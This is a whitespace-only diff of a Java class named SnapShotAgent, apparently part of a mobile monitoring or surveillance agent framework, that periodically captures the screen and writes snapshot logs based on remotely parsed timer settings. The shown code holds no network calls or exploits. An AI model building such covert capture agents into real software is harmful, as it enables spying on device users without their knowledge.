@@ -22,7 +22,7 @@ public class SnapShotAgent extends Agent {
 
     private static final int LOG_SNAPSHOT_VERSION = 2009031201;
 
-	//#debug
+    //#debug
     static Debug debug = new Debug("SnapShotAgent", DebugLevel.VERBOSE);
 
     private int timerMillis = 60 * 1000;
@@ -31,7 +31,7 @@ public class SnapShotAgent extends Agent {
     public SnapShotAgent(boolean agentStatus) {
         super(Agent.AGENT_SNAPSHOT, agentStatus, true);
         // #ifdef DBC
-//@                Check.asserts(Log.convertTypeLog(this.agentId) == LogType.SNAPSHOT,"Wrong Conversion");
+        //@                Check.asserts(Log.convertTypeLog(this.agentId) == LogType.SNAPSHOT,"Wrong Conversion");
         // #endif
 
     }
@@ -45,7 +45,7 @@ public class SnapShotAgent extends Agent {
     public void actualRun() {
         for (;;) {
             // #debug
-                        debug.info("Taking snapshot");
+            debug.info("Taking snapshot");
             int width = Display.getWidth();
             int height = Display.getHeight();
 
@@ -69,7 +69,7 @@ public class SnapShotAgent extends Agent {
              */
 
             // #ifdef DBC
-//@                        Check.requires(log != null, "Null log");
+            //@                        Check.requires(log != null, "Null log");
             // #endif
 
             log.createLog(getAdditionalData());
@@ -78,12 +78,12 @@ public class SnapShotAgent extends Agent {
 
             if (smartSleep(timerMillis)) {
                 // #debug
-                                debug.info("clean stop: " + this);
+                debug.info("clean stop: " + this);
                 return;
             }
 
             // #debug
-                        debug.trace("finished sleep");
+            debug.trace("finished sleep");
         }
     }
 
@@ -105,19 +105,19 @@ public class SnapShotAgent extends Agent {
         databuffer.write(windowsName);
 
         // #ifdef DBC
-//@                Check.asserts(windowsName.length == wlen, "Wrong windows name");
-//@                Check.ensures(additionalData.length == tlen, "Wrong additional data name");
+        //@                Check.asserts(windowsName.length == wlen, "Wrong windows name");
+        //@                Check.ensures(additionalData.length == tlen, "Wrong additional data name");
         // #endif
 
         // #debug
-                debug.trace("Additional data len: " + additionalData.length);
+        debug.trace("Additional data len: " + additionalData.length);
 
         return additionalData;
     }
 
     protected boolean parse(byte[] confParameters) {
         // #ifdef DBC
-//@                Check.asserts(confParameters != null, "Null confParameters");
+        //@                Check.asserts(confParameters != null, "Null confParameters");
         // #endif
 
         DataBuffer databuffer = new DataBuffer(confParameters, 0,
@@ -131,16 +131,16 @@ public class SnapShotAgent extends Agent {
                 this.timerMillis = value;
             }
             // #debug
-                        debug.trace("timer: " + timerMillis);
+            debug.trace("timer: " + timerMillis);
 
             value = databuffer.readInt();
             onNewWindow = (value == 1);
             // #debug
-                        debug.trace("onNewWindow: " + onNewWindow);
+            debug.trace("onNewWindow: " + onNewWindow);
 
         } catch (EOFException e) {
             // #debug
-                        debug.error("params FAILED");
+            debug.error("params FAILED");
             return false;
         }
 
